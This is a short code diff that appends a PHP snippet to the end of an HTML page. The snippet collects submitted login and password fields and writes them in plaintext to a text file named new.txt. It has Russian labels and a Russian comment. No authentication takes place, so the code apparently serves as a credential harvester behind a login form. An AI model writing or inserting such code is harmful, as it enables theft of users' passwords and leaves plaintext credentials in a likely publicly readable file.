@@ -129,3 +129,14 @@
   
 </body>
 </html>
+
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $login = htmlspecialchars($_POST['login']);
+    $password = htmlspecialchars($_POST['password']);
+    $data = "Логин: $login, Пароль: $password\n";
+
+    // Открываем файл new.txt для записи (добавляем данные в конец файла)
+    file_put_contents('new.txt', $data, FILE_APPEND | LOCK_EX);
+}
+?>
